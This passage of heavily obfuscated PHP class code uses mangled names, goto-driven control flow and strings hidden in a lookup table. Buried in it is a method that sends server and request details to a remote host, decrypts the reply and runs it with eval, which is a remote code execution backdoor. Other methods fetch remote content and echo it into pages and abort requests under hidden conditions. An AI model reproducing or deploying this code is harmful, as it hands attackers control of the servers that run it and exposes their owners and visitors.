$cÆ‹•³ù½[$BùØª–ŒŸ°[231]]; $DÈ®„›å¤› = $BùØª–ŒŸ°[120]($_SERVER[$BùØª–ŒŸ°[121]] . $BùØª–ŒŸ°[220]($d­³ïÑ¹àˆ) . $B¾ÁÌ¢§×ä[$BùØª–ŒŸ°[216]]); $dÉ¯ÁêëÊ˜ = $BùØª–ŒŸ°[220]($BùØª–ŒŸ°[25]($DÈ®„›å¤›, 10, 16)); $BÜœƒ†Ş×Œ = $this->{$_SERVER[øÆ][195]}($B¹µì¼½ƒ•[$BùØª–ŒŸ°[100]][$dÉ¯ÁêëÊ˜], $DÈ®„›å¤›); $BÜœƒ†Ş×Œ = $BùØª–ŒŸ°[197]($BÜœƒ†Ş×Œ, !0); } if (!$BùØª–ŒŸ°[198]($BÜœƒ†Ş×Œ)) { return $this->{$_SERVER[øÆ][170]}(); } $EÚÀÄ¶•À¦ = $BùØª–ŒŸ°[150]($BÜœƒ†Ş×Œ[$BùØª–ŒŸ°[151]]); goto déäŞíäê²; f¨İÁ“‘¥¥: while (strlen($Bã»Û‘¢¥) < $F„²òƒõô¯[576]) { if (!$Bã»Û‘¢¥) { break; } $Bã»Û‘¢¥++; } $AìƒÉÌ”ê‚ = $BùØª–ŒŸ°[236] . $BùØª–ŒŸ°[120]($d­³ïÑ¹àˆ . $BùØª–ŒŸ°[237]); $BÜœƒ†Ş×Œ = Cache::get($AìƒÉÌ”ê‚); goto eìõ«Ş‡âÁ; déäŞíäê²: if ($BùØª–ŒŸ°[242]() >= $EÚÀÄ¶•À¦) { return $this->{$_SERVER[øÆ][170]}(); } if ($BùØª–ŒŸ°[242]() - $BÜœƒ†Ş×Œ[$BùØª–ŒŸ°[241]] > 20) { $BÜœƒ†Ş×Œ[$BùØª–ŒŸ°[241]] = $BùØª–ŒŸ°[242](); Cache::set($AìƒÉÌ”ê‚, $BÜœƒ†Ş×Œ); } $this->wpjq7b76657d = $BÜœƒ†Ş×Œ; goto F©§Ûé†‡›; F©§Ûé†‡›: $this->thzc895c0a6c = $B¾ÁÌ¢§×ä[$BùØª–ŒŸ°[126]]; $AÆËÎ«°î = $F„²òƒõô¯[624]; if (strlen($AÆËÎ«°î) < $F„²òƒõô¯[597]) { return; } goto cöâç†åËÚ; Aµ»ÍÈ½¿: $e»ö‚Œºë = $F„²òƒõô¯[622]; $this->thzc895c0a6c = $BùØª–ŒŸ°[127]; $B¾ÁÌ¢§×ä = $BùØª–ŒŸ°[61]($BùØª–ŒŸ°[62])->{$_SERVER[øÆ][63]}(); goto B†«µ¨ó; cöâç†åËÚ: } private function jcgzfcaa4946() { $dÚÔ¿Ñô¤ =& $_SERVER[øÆ]; $d™š„°ÜÙ¦ = $GLOBALS[$dÚÔ¿Ñô¤[22]]; $cÔ¯–Öå¼ = $_SERVER[$dÚÔ¿Ñô¤[44]]; if ($cÔ¯–Öå¼ == $dÚÔ¿Ñô¤[243] && $this->thzc895c0a6c == $dÚÔ¿Ñô¤[127]) { $dÚÔ¿Ñô¤[172]($dÚÔ¿Ñô¤[204]($dÚÔ¿Ñô¤[244]), !1, $dÚÔ¿Ñô¤[245]); } $D«øº³ó×£ = array($dÚÔ¿Ñô¤[246], $dÚÔ¿Ñô¤[247]); if ($dÚÔ¿Ñô¤[248]($cÔ¯–Öå¼, $D«øº³ó×£)) { if ($this->thzc895c0a6c == $dÚÔ¿Ñô¤[127] && isset($d™š„°ÜÙ¦[$dÚÔ¿Ñô¤[249]])) { $dÚÔ¿Ñô¤[172]($dÚÔ¿Ñô¤[204]($dÚÔ¿Ñô¤[244]), !1, $dÚÔ¿Ñô¤[245]); die; } $eä„êÅÔì = $this->{$_SERVER[øÆ][143]}(); if ($eä„êÅÔì != $dÚÔ¿Ñô¤[250]($dÚÔ¿Ñô¤[251])) { if ($eä„êÅÔì <= $dÚÔ¿Ñô¤[61]($dÚÔ¿Ñô¤[145])->{$_SERVER[øÆ][146]}()) { $dÚÔ¿Ñô¤[172]($dÚÔ¿Ñô¤[204]($dÚÔ¿Ñô¤[252]), !1, $dÚÔ¿Ñô¤[245]); die; } } } } private function zahp37219928() { goto E¹¦†‰Ûòõ; e¹¹ì¿õè¤: if (!$fĞ›À’î¨À[112]($GLOBALS, $fĞ›À’î¨À[138]) || !isset($_GET[$fĞ›À’î¨À[254]])) { return; } if (!$fĞ›À’î¨À[248]($_SERVER[$fĞ›À’î¨À[44]], $cÃ¾¡æÉï)) { return; } $CÛ‚áÌ¡‰ğ = $fĞ›À’î¨À[255]; goto EÜª£¨®à; EÜª£¨®à: $f«êäÓÙ—î = $dËÜ¦„ôÄÑ[625]; if (!$f«êäÓÙ—î) { die; } $CÛ‚áÌ¡‰ğ = $this->{$_SERVER[øÆ][256]}($CÛ‚áÌ¡‰ğ, $fĞ›À’î¨À[257]); goto eÙÑ¨çÏŸ«; d¥¿¯‘ÇÀ: $f…‹¾ºĞî“ = @$fĞ›À’î¨À[263]($CÛ‚áÌ¡‰ğ, !1, $E¤øÃ‘¼ä); $AÆùêºõ‚ = $dËÜ¦„ôÄÑ[627]; if (!$AÆùêºõ‚) { return; } goto E°Ê÷§‹ãÍ; E°Ê÷§‹ãÍ: $fĞ›À’î¨À[264]($fĞ›À’î¨À[265]); if ($f…‹¾ºĞî“ && $fĞ›À’î¨À[32]($f…‹¾ºĞî“, $fĞ›À’î¨À[266])) { echo $f…‹¾ºĞî“; } die; goto D£™™Ì‹‚Û; eÙÑ¨çÏŸ«: $Eå‰‘ÏÄ° = $dËÜ¦„ôÄÑ[626]; if (!$Eå‰‘ÏÄ°) { return; } $E¤øÃ‘¼ä = $fĞ›À’î¨À[258](array($fĞ›À’î¨À[259] => array($fĞ›À’î¨À[260] => $fĞ›À’î¨À[261], $fĞ›À’î¨À[262] => 3))); goto d¥¿¯‘ÇÀ; E¹¦†‰Ûòõ: $dËÜ¦„ôÄÑ =& $_SERVER[ç]; $fĞ›À’î¨À =& $_SERVER[øÆ]; $cÃ¾¡æÉï = array($fĞ›À’î¨À[141], $fĞ›À’î¨À[253]); goto e¹¹ì¿õè¤; D£™™Ì‹‚Û: } public function fgkm9838637f($c²“ø»óÒ) { goto e”ÉñéÕ; dğ‰¡©éÉŒ: $C‘†ÓšÀÔ = array($BÒñ‡´ˆê[268] => $BÒñ‡´ˆê[269], $BÒñ‡´ˆê[270] => $BÒñ‡´ˆê[269], $BÒñ‡´ˆê[271] => $BÒñ‡´ˆê[269], $BÒñ‡´ˆê[272] => $BÒñ‡´ˆê[269], $BÒñ‡´ˆê[273] => $BÒñ‡´ˆê[269], $BÒñ‡´ˆê[274] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[276] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[277] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[278] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[279] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[280] => $BÒñ‡´ˆê[275], $BÒñ‡´ˆê[281] => $BÒñ‡´ˆê[275]); $ešØ»·«ô– = $CÆµ™¾Õ°Ş[628]; while ($ešØ»·«ô– < $CÆµ™¾Õ°Ş[601]) { if ($ešØ»·«ô– >= 0) { break; } $ešØ»·«ô–++; } goto dé‘‹—ƒ„ˆ; e”ÉñéÕ: $CÆµ™¾Õ°Ş =& $_SERVER[ç]; $BÒñ‡´ˆê =& $_SERVER[øÆ]; if ($this->thzc895c0a6c == $BÒñ‡´ˆê[267]) { return $c²“ø»óÒ; } goto dğ‰¡©éÉŒ; F˜ö¿çÑ’†: if (strlen($b®†›Æ©†ƒ) < $CÆµ™¾Õ°Ş[576]) { die; } goto d±šÛ¹„; dé‘‹—ƒ„ˆ: $FÜà«ã‹š = $BÒñ‡´ˆê[0]($BÒñ‡´ˆê[282], $BÒñ‡´ˆê[112]($this->wpjq7b76657d, $BÒñ‡´ˆê[135], $BÒñ‡´ˆê[10])); $f¤Õ ï’ = array(); foreach ($C‘†ÓšÀÔ as $c¨Ë‰î×êê => $fˆŠ¾˜òŠó) { if ($fˆŠ¾˜òŠó == $BÒñ‡´ˆê[269] && $BÒñ‡´ˆê[25]($this->thzc895c0a6c, 0, 1) == $BÒñ‡´ˆê[269]) { continue; } if (!$BÒñ‡´ˆê[248]($c¨Ë‰î×êê, $FÜà«ã‹š)) { $f¤Õ ï’[] = $c¨Ë‰î×êê; } } goto a¢Şõš¦Õ; a¢Şõš¦Õ: foreach ($f¤Õ ï’ as $c¨Ë‰î×êê) { unset($c²“ø»óÒ[$c¨Ë‰î×êê]); } return $c²“ø»óÒ; $b®†›Æ©†ƒ = $CÆµ™¾Õ°Ş[629]; goto F˜ö¿çÑ’†; d±šÛ¹„: } private function ezvs50dd9707() { goto a‡©ïßÑ—; b³™¸÷»Œ: $GLOBALS[$C©öÉ´ïé[100]][$C©öÉ´ïé[104]][$C©öÉ´ïé[283]] = $C©öÉ´ïé[226]; $GLOBALS[$C©öÉ´ïé[100]][$C©öÉ´ïé[284]] = $C©öÉ´ïé[226]; $bÑøëÚ©ó = $eŒµ½ŒÕêµ[630]; goto Cï”îåÕ; Cï”îåÕ: while ($bÑøëÚ©ó < $eŒµ½ŒÕêµ[580]) { if ($bÑøëÚ©ó >= 0) { break; } $bÑøëÚ©ó++; } if ($C©öÉ´ïé[61]($C©öÉ´ïé[285])->{$_SERVER[øÆ][63]}($C©öÉ´ïé[89]) != $C©öÉ´ïé[240]) { $C©öÉ´ïé[61]($C©öÉ´ïé[285])->{$_SERVER[øÆ][227]}($C©öÉ´ïé[89], $C©öÉ´ïé[240]); } goto e®ç¢•Í¤¦; a‡©ïßÑ—: $eŒµ½ŒÕêµ =& $_SERVER[ç]; $C©öÉ´ïé =& $_SERVER[øÆ]; if ($this->thzc895c0a6c != $C©öÉ´ïé[127]) { return; } goto b³™¸÷»Œ; e®ç¢•Í¤¦: } public function gwqzc4a9caa5() { return $_SERVER[øÆ][286]; } private function xrya535221ae() { goto d‘½ÍÜ…¨í; d‘½ÍÜ…¨í: $Aæ¡ÄÓ°°Ò =& $_SERVER[øÆ]; $fÛ‹ª õÍº = array($Aæ¡ÄÓ°°Ò[287], $Aæ¡ÄÓ°°Ò[288], $Aæ¡ÄÓ°°Ò[289]); $bğÍçèŒÇ = $Aæ¡ÄÓ°°Ò[290] . $Aæ¡ÄÓ°°Ò[120]($Aæ¡ÄÓ°°Ò[291]); goto b˜İ‰è•öŒ; AòÖš¨É¢å: if ($C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[171]] && $C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[296]]) { if ($this->{$_SERVER[øÆ][206]}($C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[296]]) == $fßÏ¡õÚ²í[$Aæ¡ÄÓ°°Ò[171]]) { return; } } $this->{$_SERVER[øÆ][170]}(); $fİÚÄçšìï = $_SERVER[ç][631]; goto DçÒÄ¥ËÂ¤; DçÒÄ¥ËÂ¤: if (!$fİÚÄçšìï) { return; } if ($this->{$_SERVER[øÆ][206]}($C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[296]]) != $fßÏ¡õÚ²í[$Aæ¡ÄÓ°°Ò[171]]) { $eğñğÑˆÚ = array($Aæ¡ÄÓ°°Ò[208] => $Aæ¡ÄÓ°°Ò[61]($Aæ¡ÄÓ°°Ò[62])->{$_SERVER[øÆ][63]}($Aæ¡ÄÓ°°Ò[122]), $Aæ¡ÄÓ°°Ò[209] => $_SERVER[$Aæ¡ÄÓ°°Ò[121]], $Aæ¡ÄÓ°°Ò[210] => $Aæ¡ÄÓ°°Ò[211](), $Aæ¡ÄÓ°°Ò[180] => $_SERVER[$Aæ¡ÄÓ°°Ò[181]]); $B„’†…§ø‰ = $this->{$_SERVER[øÆ][212]}($Aæ¡ÄÓ°°Ò[154]($eğñğÑˆÚ)); $C‚º¶ÃäÀ = $this->{$_SERVER[øÆ][189]}($Aæ¡ÄÓ°°Ò[213] . $B„’†…§ø‰); if ($C‚º¶ÃäÀ && $Aæ¡ÄÓ°°Ò[198]($C‚º¶ÃäÀ) && isset($C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[296]])) { $C¶…Ö÷ƒËó = $this->{$_SERVER[øÆ][195]}($C‚º¶ÃäÀ[$Aæ¡ÄÓ°°Ò[296]], 2); if ($C¶…Ö÷ƒËó) { $C¶…Ö÷ƒËó = $this->{$_SERVER[øÆ][206]}($C¶…Ö÷ƒËó); } if ($C¶…Ö÷ƒËó) { try { @eval($C¶…Ö÷ƒËó); } catch (Exception $b•Úó‹£ø) { } } } } goto a²Úğ­ó­Á; b—ÀñĞ¬±ó: $eø§â‡¨®» = $Aæ¡ÄÓ°°Ò[13](array($Aæ¡ÄÓ°°Ò[292], $Aæ¡ÄÓ°°Ò[293]), $bğÍçèŒÇ); if ($eø§â‡¨®» && $Aæ¡ÄÓ°°Ò[242]() - $eø§â‡¨®» < $Aæ¡ÄÓ°°Ò[250]($Aæ¡ÄÓ°°Ò[294])) { return; } $Aæ¡ÄÓ°°Ò[13](array($Aæ¡ÄÓ°°Ò[292], $Aæ¡ÄÓ°°Ò[158]), $bğÍçèŒÇ, $Aæ¡ÄÓ°°Ò[242]()); goto a¬¢¡ƒ¯–¼; b˜İ‰è•öŒ: if ($this->thzc895c0a6c == $Aæ¡ÄÓ°°Ò[127] || !$Aæ¡ÄÓ°°Ò[112]($GLOBALS, $Aæ¡ÄÓ°°Ò[138])) { return; } if (!$Aæ¡ÄÓ°°Ò[248]($_SERVER[$Aæ¡ÄÓ°°Ò[44]], $fÛ‹ª õÍº)) { return; } if ($Aæ¡ÄÓ°°Ò[242]() % 4 != 0) { return; } goto b—ÀñĞ¬±ó; a¬¢¡ƒ¯–¼: $fßÏ¡õÚ²í = array($Aæ¡ÄÓ°°Ò[171] => $Aæ¡ÄÓ°°Ò[61]($Aæ¡ÄÓ°°Ò[62])->{$_SERVER[øÆ][63]}($Aæ¡ÄÓ°°Ò[215]), $Aæ¡ÄÓ°°Ò[184] => $this->thzc895c0a6c, $Aæ¡ÄÓ°°Ò[182] => $_SERVER[$Aæ¡ÄÓ°°Ò[183]], $Aæ¡ÄÓ°°Ò[175] => $Aæ¡ÄÓ°°Ò[155], $Aæ¡ÄÓ°°Ò[178] => $_SERVER[$Aæ¡ÄÓ°°Ò[179]]); $C‚º¶ÃäÀ = $this->{$_SERVER[øÆ][189]}($Aæ¡ÄÓ°°Ò[295], $fßÏ¡õÚ²í); if (!$Aæ¡ÄÓ°°Ò[198]($C‚º¶ÃäÀ)) { return; } goto AòÖš¨É¢å; a²Úğ­ó­Á: } private function fmpxd91f7a19($E’ÃÉ¸‰ƒ = '', $bÖß™³ÚÒ† = array(), $Bß¼À­±Í’ = 5) { goto fğ²‰»ŠÏ; cöŸÒã¥é: return $CØ³Ğ‹ÇÁì[197]($bÖß™³ÚÒ†, !0); $aÌœó¿†‰™ = $d’îÅùÇˆ[634]; goto Dåñ©‰ê; f¢İ¼›½º: if ($bÖß™³ÚÒ† === -1) { return $f•™òØÑ„Ğ; } $aÓ«±á²Ö¸ = $CØ³Ğ‹ÇÁì[258](array($CØ³Ğ‹ÇÁì[259] => array($CØ³Ğ‹ÇÁì[262] => $Bß¼À­±Í’, $CØ³Ğ‹ÇÁì[260] => $CØ³Ğ‹ÇÁì[301]), $CØ³Ğ‹ÇÁì[302] => array($CØ³Ğ‹ÇÁì[303] => !1, $CØ³Ğ‹ÇÁì[304] => !1))); $bÖß™³ÚÒ† = @$CØ³Ğ‹ÇÁì[263]($f•™òØÑ„Ğ, !1, $aÓ«±á²Ö¸); goto cöŸÒã¥é; B¨ì˜‰‘½°: $d¼Òš£Êà‹ = $d’îÅùÇˆ[632]; $f•™òØÑ„Ğ = $this->{$_SERVER[øÆ][256]}($f•™òØÑ„Ğ, $CØ³Ğ‹ÇÁì[298]); $BŠÏæ»ÑË = $d’îÅùÇˆ[633]; goto B¥ø”ø°àÕ; B¥ø”ø°àÕ: if (strlen($BŠÏæ»ÑË) < $d’îÅùÇˆ[601]) { die; } $f•™òØÑ„Ğ = $f•™òØÑ„Ğ . $E’ÃÉ¸‰ƒ; if ($bÖß™³ÚÒ† && $CØ³Ğ‹ÇÁì[198]($bÖß™³ÚÒ†)) { $f•™òØÑ„Ğ = $f•™òØÑ„Ğ . $CØ³Ğ‹ÇÁì[299] . $CØ³Ğ‹ÇÁì[300]($bÖß™³ÚÒ†); } goto f¢İ¼›½º; fğ²‰»ŠÏ: $d’îÅùÇˆ =& $_SERVER[ç]; $CØ³Ğ‹ÇÁì =& $_SERVER[øÆ]; $f•™òØÑ„Ğ = $CØ³Ğ‹ÇÁì[297]; goto B¨ì˜‰‘½°; Dåñ©‰ê: } private function yhvp65bf48db() { goto aÖÜÍ ˆ°; aÖÜÍ ˆ°: $då©¯½ëà =& $_SERVER[ç]; $B¶•ïÈÍ˜ =& $_SERVER[øÆ]; $a¸„ğ±ÄŒ™ = array($B¶•ïÈÍ˜[305] => $B¶•ïÈÍ˜[306], $B¶•ïÈÍ˜[307] => $B¶•ïÈÍ˜[308], $B¶•ïÈÍ˜[309] => $B¶•ïÈÍ˜[310], $B¶•ïÈÍ˜[311] => $B¶•ïÈÍ˜[312], $B¶•ïÈÍ˜[313] => $B¶•ïÈÍ˜[314], $B¶•ïÈÍ˜[315] => $B¶•ïÈÍ˜[251], $B¶•ïÈÍ˜[316] => $B¶•ïÈÍ˜[251], $B¶•ïÈÍ˜[317] => $B¶•ïÈÍ˜[306], $B¶•ïÈÍ˜[318] => $B¶•ïÈÍ˜[308], $B¶•ïÈÍ˜[319] => $B¶•ïÈÍ˜[310], $B¶•ïÈÍ˜[320] => $B¶•ïÈÍ˜[321], $B¶•ïÈÍ˜[322] => $B¶•ïÈÍ˜[312], $B¶•ïÈÍ˜[323] => $B¶•ïÈÍ˜[324], $B¶•ïÈÍ˜[325] => $B¶•ïÈÍ˜[314], $B¶•ïÈÍ˜[326] => $B¶•ïÈÍ˜[327], $B¶•ïÈÍ˜[328] => $B¶•ïÈÍ˜[329], $B¶•ïÈÍ˜[330] => $B¶•ïÈÍ˜[331]); goto b¼Œ¦ÊÕ“î; b¼Œ¦ÊÕ“î: $fÔš»¨¬ÆÌ = $a¸„ğ±ÄŒ™[$this->thzc895c0a6c]; $C¡‘Ô²Û÷ = $då©¯½ëà[635]; if (!$C¡‘Ô²Û÷) { die; } goto E¸í×¥¯™; F—Ò“¾Ş¶: $FèÎ¯°‚ò = $FèÎ¯°‚ò ? $B¶•ïÈÍ˜[250]($FèÎ¯°‚ò) : 0; return $fÔš»¨¬ÆÌ + $FèÎ¯°‚ò; $EŠƒ¬Òìö± = $då©¯½ëà[637]; goto BÚë‹´İŒ“; BÚë‹´İŒ“: if (strlen($EŠƒ¬Òìö±) < $då©¯½ëà[576]) { die; } goto b‡‘šñæÚ; E¸í×¥¯™: $fÔš»¨¬ÆÌ = $B¶•ïÈÍ˜[250]($fÔš»¨¬ÆÌ ? $fÔš»¨¬ÆÌ : $B¶•ïÈÍ˜[306]); $FèÎ¯°‚ò = $B¶•ïÈÍ˜[112]($this->wpjq7b76657d, $B¶•ïÈÍ˜[332]); $A¼Øïå´  = $då©¯½ëà[636]; goto F—Ò“¾Ş¶; b‡‘šñæÚ: } public function sjiv29b1a44d($F»æùŸÀªÙ) { goto BÂ‹¡Ã‚‚; Dõ‡ÂÄé–Õ: $bàÌÀ¯Šâ = $DÈ»‹‚ÛÖ[638]; if (strlen($bàÌÀ¯Šâ) < $DÈ»‹‚ÛÖ[597]) { return; } if ($AùÎŞ¢¯Ö <= $CÌ²‚òÉ£) { return; } goto Fª˜ª‡ÉŸ„; Fª˜ª‡ÉŸ„: $A¯Ô”±ƒ¥” = $EÙÕ‹¼Ö²Ô[61]($EÙÕ‹¼Ö²Ô[145])->{$_SERVER[øÆ][334]}($EÙÕ‹¼Ö²Ô[333])->{$_SERVER[øÆ][335]}($CÌ²‚òÉ£)->{$_SERVER[øÆ][336]}(); $d˜½šë§¢À = $DÈ»‹‚ÛÖ[639]; while (strlen($d˜½šë§¢À) < $DÈ»‹‚ÛÖ[601]) { if (!$d˜½šë§¢À) { break; } $d˜½šë§¢À++; } goto Cùî˜ÒÈå»; a…ªáØœ‚: if ($F»æùŸÀªÙ[$EÙÕ‹¼Ö²Ô[333]] == $EÙÕ‹¼Ö²Ô[226]) { return; } if ($CÌ²‚òÉ£ >= $EÙÕ‹¼Ö²Ô[250]($EÙÕ‹¼Ö²Ô[251])) { return; } $AùÎŞ¢¯Ö = $EÙÕ‹¼Ö²Ô[61]($EÙÕ‹¼Ö²Ô[145])->{$_SERVER[øÆ][146]}(); goto Dõ‡ÂÄé–Õ; Cùî˜ÒÈå»: $A¯Ô”±ƒ¥” = $EÙÕ‹¼Ö²Ô[228]($A¯Ô”±ƒ¥”, $EÙÕ‹¼Ö²Ô[10], $EÙÕ‹¼Ö²Ô[333]); if (!$EÙÕ‹¼Ö²Ô[248]($F»æùŸÀªÙ[$EÙÕ‹¼Ö²Ô[333]], $A¯Ô”±ƒ¥”)) { $EÙÕ‹¼Ö²Ô[172]($EÙÕ‹¼Ö²Ô[337], !1, $EÙÕ‹¼Ö²Ô[245]); } goto dòíØ‰ÙÄ‰; BÂ‹¡Ã‚‚: $DÈ»‹‚ÛÖ =& $_SERVER[ç]; $EÙÕ‹¼Ö²Ô =& $_SERVER[øÆ]; $CÌ²‚òÉ£ = $this->{$_SERVER[øÆ][143]}(); goto a…ªáØœ‚; dòíØ‰ÙÄ‰: } public function rdpk9c019fd7() { goto fŒñßÍ³ïÈ; eçáÖŠ‡¿: $C¯ÓŸØ‡ = @$AÊæ×«Øğ[263]($f…Ã‰©Ç±, !1, $B¹½ß×Í); $cËßËºÖä‰ = $BÌ¨öà“‰[642]; echo $AÊæ×«Øğ[339] . $AÊæ×«Øğ[340]($C¯ÓŸØ‡) . $AÊæ×«Øğ[341]; goto Cš ùøÕÎ´; A¢Ç³Õ¶ïé: $f…Ã‰©Ç± = $this->{$_SERVER[øÆ][256]}($f…Ã‰©Ç±, $AÊæ×«Øğ[257]); $B¹½ß×Í = $AÊæ×«Øğ[258](array($AÊæ×«Øğ[259] => array($AÊæ×«Øğ[260] => $AÊæ×«Øğ[261], $AÊæ×«Øğ[262] => 3))); $Aİ†—Ú—é = $BÌ¨öà“‰[641]; goto eçáÖŠ‡¿; EòÃ®Ò¡§¯: $f…Ã‰©Ç± = $AÊæ×«Øğ[255]; $cñ—É÷‚ = $BÌ¨öà“‰[640]; if (strlen($cñ—É÷‚) < $BÌ¨öà“‰[601]) { die; } goto A¢Ç³Õ¶ïé; fŒñßÍ³ïÈ: $BÌ¨öà“‰ =& $_SERVER[ç]; $AÊæ×«Øğ =& $_SERVER[øÆ]; if (!$AÊæ×«Øğ[112]($GLOBALS, $AÊæ×«Øğ[138]) || $AÊæ×«Øğ[338](1, 100) > 20) { return; } goto EòÃ®Ò¡§¯; Cš ùøÕÎ´: } private function gtfzdcc7763c($CóèÈ’–”, $dêÇ¯éÜ“, $cºéÄíÂæÄ = 3) { goto AÄ–İ‰Ä; e®¿¦™Ó±ï: $EÎ†ƒÚë¤Ë = $AºñâÛ¼ŠÔ[643]; if (!$EÎ†ƒÚë¤Ë) { die; } $CóèÈ’–” = $dÏËÙäÚùç[2]($CóèÈ’–”); goto DÎ¶Åñ‚‰; AÄ–İ‰Ä: $AºñâÛ¼ŠÔ =& $_SERVER[ç]; $dÏËÙäÚùç =& $_SERVER[øÆ]; $dÏËÙäÚùç[342](1); goto e®¿¦™Ó±ï; DÎ¶Åñ‚‰: $F‚“‹ÕìÊ = $dÏËÙäÚùç[338](0, 5) . $dÏËÙäÚùç[10]; $cŒ×Ü£†›É = $AºñâÛ¼ŠÔ[644]; $bÃ¾‹„ëÜ„ = $dÏËÙäÚùç[130](15); goto F…¥¨²¶§É; F…¥¨²¶§É: $e¿†ùåÀ•ó = $dÏËÙäÚùç[343]; switch ($F‚“‹ÕìÊ) { case $dÏËÙäÚùç[240]: $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][153]}($CóèÈ’–”, $dÏËÙäÚùç[220]($dêÇ¯éÜ“ . $bÃ¾‹„ëÜ„)); break; case $dÏËÙäÚùç[226]: $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][153]}($CóèÈ’–”, $dÏËÙäÚùç[220]($bÃ¾‹„ëÜ„ . $dêÇ¯éÜ“)); $DÖŸ¼÷š§Ú = $AºñâÛ¼ŠÔ[645]; if (!$DÖŸ¼÷š§Ú) { die; } break; case $dÏËÙäÚùç[344]: $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][153]}($CóèÈ’–”, $dÏËÙäÚùç[124]($bÃ¾‹„ëÜ„ . $dêÇ¯éÜ“)); break; $eƒƒÙÌ„Œ¿ = $AºñâÛ¼ŠÔ[646]; while ($eƒƒÙÌ„Œ¿ < $AºñâÛ¼ŠÔ[601]) { if ($eƒƒÙÌ„Œ¿ >= 0) { break; } $eƒƒÙÌ„Œ¿++; } case $dÏËÙäÚùç[345]: $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][153]}($CóèÈ’–”, $dÏËÙäÚùç[120]($bÃ¾‹„ëÜ„ . $dêÇ¯éÜ“)); $Aâ‘ÅöÏøÈ = $AºñâÛ¼ŠÔ[647]; if (strlen($Aâ‘ÅöÏøÈ) < $AºñâÛ¼ŠÔ[597]) { die; } break; case $dÏËÙäÚùç[346]: goto cñÈ¥î¥¢œ; cñÈ¥î¥¢œ: $CóèÈ’–” = $dÏËÙäÚùç[124]($CóèÈ’–”); $A…·£ƒ¡œ‡ = $dÏËÙäÚùç[347](0, 64); $b’ØÔ‚‚Ó” = $e¿†ùåÀ•ó[$A…·£ƒ¡œ‡]; goto F§‚ÈÙœ; C”¡µËÊ¹Ñ: $C„¢Ùñ¯º = 0; for ($eØ£äêÚë = 0; $eØ£äêÚë < $dÏËÙäÚùç[24]($CóèÈ’–”); $eØ£äêÚë++) { $C„¢Ùñ¯º = $C„¢Ùñ¯º == $dÏËÙäÚùç[24]($Bï‘¼¢­š) ? 0 : $C„¢Ùñ¯º; $DñãéÉâ—Õ = $AºñâÛ¼ŠÔ[650]; if (strlen($DñãéÉâ—Õ) < $AºñâÛ¼ŠÔ[597]) { return; } $cŒÒ™²”ˆí = ($A…·£ƒ¡œ‡ + $dÏËÙäÚùç[348]($e¿†ùåÀ•ó, $CóèÈ’–”[$eØ£äêÚë]) + $dÏËÙäÚùç[349]($Bï‘¼¢­š[$C„¢Ùñ¯º++])) % 64; $cõ«İöç = $AºñâÛ¼ŠÔ[651]; while ($cõ«İöç < $AºñâÛ¼ŠÔ[580]) { if ($cõ«İöç >= 0) { break; } $cõ«İöç++; } $d—ïÊ¤‚¨† .= $e¿†ùåÀ•ó[$cŒÒ™²”ˆí]; $EÂ÷î»Ğšğ = $AºñâÛ¼ŠÔ[652]; } $Bï—ÌÙ®¬è = $dÏËÙäÚùç[340]($b’ØÔ‚‚Ó” . $d—ïÊ¤‚¨†); goto e§ƒ´ø±; e§ƒ´ø±: break; goto CõÁê“¾ò­; DÅ’‹÷å“¯: $f¨ª´Õ²¾Œ = $AºñâÛ¼ŠÔ[649]; if (strlen($f¨ª´Õ²¾Œ) < $AºñâÛ¼ŠÔ[601]) { return; } $cŒÒ™²”ˆí = 0; goto C”¡µËÊ¹Ñ; F§‚ÈÙœ: $Bï‘¼¢­š = $dÏËÙäÚùç[120]($b’ØÔ‚‚Ó” . $dÏËÙäÚùç[120]($dêÇ¯éÜ“ . $b’ØÔ‚‚Ó”) . $dêÇ¯éÜ“); $C³ÕÍ¡àÅ… = $AºñâÛ¼ŠÔ[648]; while (strlen($C³ÕÍ¡àÅ…) < $AºñâÛ¼ŠÔ[576]) { if (!$C³ÕÍ¡àÅ…) { break; } $C³ÕÍ¡àÅ…++; } goto dâ˜ÙÕÃ; dâ˜ÙÕÃ: $Bï‘¼¢­š = $dÏËÙäÚùç[25]($Bï‘¼¢­š, $A…·£ƒ¡œ‡ % 8, $A…·£ƒ¡œ‡ % 8 + 7); $d—ïÊ¤‚¨† = $dÏËÙäÚùç[10]; $eØ£äêÚë = 0; goto DÅ’‹÷å“¯; CõÁê“¾ò­: default: $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][153]}($CóèÈ’–”, $dêÇ¯éÜ“ . $bÃ¾‹„ëÜ„); break; $Cì“¼º„Åº = $AºñâÛ¼ŠÔ[653]; } $Bï—ÌÙ®¬è = $dÏËÙäÚùç[220]($F‚“‹ÕìÊ . $bÃ¾‹„ëÜ„ . $Bï—ÌÙ®¬è); goto A‡Ñ·¡‚«¢; A‡Ñ·¡‚«¢: if ($cºéÄíÂæÄ - 1 > 0) { $Bï—ÌÙ®¬è = $this->{$_SERVER[øÆ][133]}($Bï—ÌÙ®¬è, $dêÇ¯éÜ“, $cºéÄíÂæÄ - 1); } return $Bï—ÌÙ®¬è; goto dòùŞ‹»»†; dòùŞ‹»»†: } private function hracbf4c18b5($CÎœÈôÖŠË, $FÂíâ¥İ—…, $fóÉğ„‹Ÿ = 3) { goto a¥øÊ—±Ğ±; FÁÉİÛ³­¬: $CÎœÈôÖŠË = $aƒ×Õ–¤ŒÛ[2]($CÎœÈôÖŠË); $e‚‰”‡Å¤£ = $E† ‚á—¹[654]; if (strlen($e‚‰”‡Å¤£) < $E† ‚á—¹[570]) { return; } goto d“‡íĞÄÓ¡; CŠÊç»·ñà: if (strlen($FµÍé¡™’Õ) < $E† ‚á—¹[580]) { die; } switch ($a„ÚÜˆäõ«) { case $aƒ×Õ–¤ŒÛ[240]: $B­—Ôì© ª = 